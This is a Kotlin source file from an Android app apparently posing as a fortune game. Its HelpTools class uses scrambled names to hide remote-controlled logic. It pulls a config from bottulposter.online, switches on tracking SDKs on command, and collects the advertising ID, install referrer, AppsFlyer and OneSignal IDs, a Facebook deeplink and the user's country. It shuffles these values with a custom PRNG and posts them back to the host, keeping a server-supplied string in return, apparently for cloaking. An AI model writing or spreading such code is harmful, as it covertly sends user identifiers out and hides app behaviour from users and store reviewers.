package com.example.fortunegame

import androidx.annotation.Keep
import android.app.Activity
import android.content.Context
import android.os.RemoteException
import android.webkit.WebSettings
import androidx.core.content.edit
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.LoggingBehavior
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info
import com.google.android.gms.ads.identifier.AdvertisingIdClient.getAdvertisingIdInfo
import com.google.gson.Gson
import com.google.gson.annotations.SerializedName
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.supervisorScope
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.converter.scalars.ScalarsConverterFactory
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Headers
import retrofit2.http.POST
import kotlin.coroutines.suspendCoroutine

class HelpTools(
    private val activity: Activity,
) {
    private val sgzawdd = activity.getSharedPreferences(OCSQNAS, Context.MODE_PRIVATE)

    private var lastMinute: String?
        get() = sgzawdd.getString(LRZAFI_BXDBXDD, null)
        set(value) = sgzawdd.edit {
            putString(LRZAFI_BXDBXDD, value)
        }

    private var pfiltaw: String?
        get() = sgzawdd.getString(LRZAFI_DSSNU, null)
        set(value) = sgzawdd.edit { putString(LRZAFI_DSSNU, value) }

    private var ildwuodv: Boolean
        get() = sgzawdd.getBoolean(LRZAFI_KPITU, false)
        set(value) = sgzawdd.edit { putBoolean(LRZAFI_KPITU, value) }

    private suspend fun advertisingId(): String? = withContext(Dispatchers.Default) {
        var adInfo: Info? = null
        try {
            @Suppress("BlockingMethodInNonBlockingContext")
            adInfo = getAdvertisingIdInfo(activity)
        } catch (_: Exception) {

        }

        return@withContext adInfo?.id
    }

    @Suppress("DEPRECATION")
    private fun initFacebook(antiSend: String?) {
        antiSend?.let { FacebookSdk.setApplicationId(it) }
        FacebookSdk.setAutoInitEnabled(false)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.addLoggingBehavior(LoggingBehavior.APP_EVENTS)
        FacebookSdk.sdkInitialize(activity)
        FacebookSdk.fullyInitialize()
    }

    private suspend fun facebookDeeplink(): String? = suspendCoroutine {
        AppLinkData.fetchDeferredAppLinkData(activity) { appLink ->
            it.resumeWith(Result.success(appLink?.let { it.targetUri.toString() }))
        }
    }

    private suspend fun installReferrer() =
        suspendCoroutine<String?> { continuation ->
            val refClient = InstallReferrerClient.newBuilder(activity).build()
            val listener: InstallReferrerStateListener =
                object : InstallReferrerStateListener {
                    override fun onInstallReferrerSetupFinished(responseCode: Int) {
                        var installReferrer: String? = null
                        when (responseCode) {
                            InstallReferrerClient.InstallReferrerResponse.OK ->
                                try {
                                    val details: ReferrerDetails = refClient.installReferrer
                                    refClient.endConnection()

                                    installReferrer = details.installReferrer
                                } catch (e: RemoteException) {
                                    e.printStackTrace()
                                }
                            else -> {

                            }
                        }

                        continuation.resumeWith(Result.success(installReferrer))
                    }

                    override fun onInstallReferrerServiceDisconnected() {
                        refClient.startConnection(this)
                    }
                }

            refClient.startConnection(listener)
        }

    private suspend fun appsflyerDeviceId(millis: String) =
        suspendCoroutine<String?> {
            val callback = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(conversionData: Map<String, Any>) = Unit
                override fun onConversionDataFail(errorMessage: String) = Unit
                override fun onAppOpenAttribution(attributionData: Map<String, String>) = Unit
                override fun onAttributionFailure(errorMessage: String) = Unit
            }

            AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(false)
            AppsFlyerLib.getInstance().init(millis, callback, activity)
            AppsFlyerLib.getInstance().start(activity)

            it.resumeWith(Result.success(AppsFlyerLib.getInstance().getAppsFlyerUID(activity)))
        }

    fun initOnesignal() {
        lastMinute?.let {
            OneSignal.setAppId(it)
            OneSignal.unsubscribeWhenNotificationsAreDisabled(true)
            OneSignal.initWithContext(activity)
        }
    }

    suspend fun opduv(): String? = supervisorScope {
        if (ildwuodv) {
            initOnesignal()

            return@supervisorScope this@HelpTools.pfiltaw
        }

        val slotolxnay = slotolxnay()

        val config = slotolxnay.config()

        lastMinute = config.lastMinute

        initOnesignal()

        if (!config.created) {
            ildwuodv = true

            return@supervisorScope null
        }

        var facebookDeeplink: String? = null
        if (config.introduceText && config.antiSend != null) {
            initFacebook(config.antiSend)
            if (config.welcome) {
                facebookDeeplink = facebookDeeplink()
            }
        }

        val installReferrer = installReferrer()
        val advertisingId = advertisingId()
        val appsflyerClientId =
            if (config.seconds && config.millis != null) appsflyerDeviceId(config.millis) else null
        val onesignalClientId = OneSignal.getDeviceState()?.userId

        val ipolxnay = ipolxnay()

        val countryCode = try {
            ipolxnay.getUserData().countryCode
        } catch (e: Exception) {
            null
        }

        val params = mutableListOf<Any?>(
            advertisingId,
            onesignalClientId,
            appsflyerClientId,
            installReferrer,
            facebookDeeplink,
            countryCode
        )

        val paramsOrderMap = createMapping(RUQAD)

        val paramsReordered = mutableListOf<Any?>()
        paramsOrderMap.keys.sorted().forEach {
            paramsOrderMap[it]?.let { value -> paramsReordered += params[value] }
        }

        val jsonParams = Gson().toJson(paramsReordered)

        val pfiltaw = slotolxnay.defence(jsonParams)

        this@HelpTools.pfiltaw = pfiltaw
        ildwuodv = true

        pfiltaw
    }

    private fun slotolxnay(): ikdalgvolxnay {
        val httpClientBuilder: OkHttpClient.Builder = OkHttpClient.Builder()
        httpClientBuilder.addInterceptor { chain ->
            val original: Request = chain.request()

            val request = original.newBuilder()
                .header("User-Agent", WebSettings.getDefaultUserAgent(activity))
                .method(
                    original.method,
                    original.body
                )
                .build()

            chain.proceed(request)
        }

        httpClientBuilder.addInterceptor(HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        })

        val retrofit = Retrofit.Builder()
            .baseUrl("https://$IKYBKKUP/")
            .client(httpClientBuilder.build())
            .addConverterFactory(ScalarsConverterFactory.create())
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        return retrofit.create(ikdalgvolxnay::class.java)
    }

    private fun ipolxnay(): mpuumiolxnay {
        val httpClientBuilder: OkHttpClient.Builder = OkHttpClient.Builder()
        httpClientBuilder.addInterceptor { chain ->
            val original: Request = chain.request()

            val request = original.newBuilder()
                .header("User-Agent", WebSettings.getDefaultUserAgent(activity))
                .method(
                    original.method,
                    original.body
                )
                .build()

            chain.proceed(request)
        }

        httpClientBuilder.addInterceptor(HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        })

        val retrofit = Retrofit.Builder()
            .baseUrl(WWTXUT_IKYBKKUP)
            .client(httpClientBuilder.build())
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        return retrofit.create(mpuumiolxnay::class.java)
    }

    companion object {
        const val RUQAD = 8

        const val OCSQNAS = "sgzawdd"
        const val LRZAFI_BXDBXDD = "qudbf_noupggve"
        const val LRZAFI_DSSNU = "qudbf_pfiltaw"
        const val LRZAFI_KPITU = "qudbf_ildwuodv"

        const val AEKGTISU = "agrement"

        const val TMVUBICP = "countryCode"

        const val DSSNU_WZCCA = "uid"

        const val IKYBKKUP = "bottulposter.online"
        const val WWTXUT_IKYBKKUP = "http://ip-api.com"
    }

    interface ikdalgvolxnay {
        @GET("/")
        suspend fun config(): ESLLHHL

        @POST("/")
        @JvmSuppressWildcards(suppress = true)
        @Headers("Content-Type: application/json")
        suspend fun defence(@Body params: String): String?
    }

    interface mpuumiolxnay {
        @GET("/json")
        suspend fun getUserData(): WWTXUTolxnay
    }

    @Keep
    data class WWTXUTolxnay(
        @SerializedName(TMVUBICP) var countryCode: String? = null
    )

    @Keep
    data class ESLLHHL(
        val created: Boolean,
        val lastMinute: String,
        val seconds: Boolean,
        val millis: String?,
        val introduceText: Boolean,
        val welcome: Boolean,
        val antiSend: String?
    )

    class smgrf(seed: Long) {
        companion object {
            const val p2_16 = 0x0000000010000
            const val p2_31 = 0x0000080000000
            const val p2_32 = 0x0000100000000

            const val m2_16: Long = 0xffff

            const val c2: Long = 0x0005
            const val c1: Long = 0xdeec
            const val c0: Long = 0xe66d
        }

        private var s2: Long = 0
        private var s1: Long = 0
        var s0: Long = 0

        init {
            s0 = seed and m2_16 xor c0
            s1 = seed / p2_16 and m2_16 xor c1
            s2 = seed / p2_32 and m2_16 xor c2
        }

        private fun _next(): Long {
            var carry: Long = 0xb

            var r0 = (s0 * c0) + carry
            carry = r0 shr 16
            r0 = r0 and m2_16

            var r1 = (s1 * c0 + s0 * c1) + carry
            carry = r1 shr 16
            r1 = r1 and m2_16

            var r2 = (s2 * c0 + s1 * c1 + s0 * c2) + carry
            r2 = r2 and m2_16

            s2 = r2
            s1 = r1
            s0 = r0

            return s2 * p2_16 + s1
        }

        fun next(bits: Int): Long {
            return _next() shr (32 - bits)
        }

        fun nextInt(bound: Int): Int {
            if ((bound and -bound) == bound) {
                val r = next(31) / p2_31
                return (bound * r).toInt()
            }

            var bits: Long
            var value: Long
            do {
                bits = next(31)
                value = bits % bound
            } while (bits - value + (bound - 1) < 0)
            return value.toInt()
        }
    }

    fun createMapping(id: Int): MutableMap<Int, Int> {
        val random = smgrf(id.toLong())
        val map = mutableMapOf<Int, Int>()

        for (param in 0..5) {
            var unique: Boolean
            var index: Int
            do {
                index = random.nextInt(6)
                unique = !map.containsKey(index)
            } while (!unique)

            map[index] = param
        }

        return map
    }
}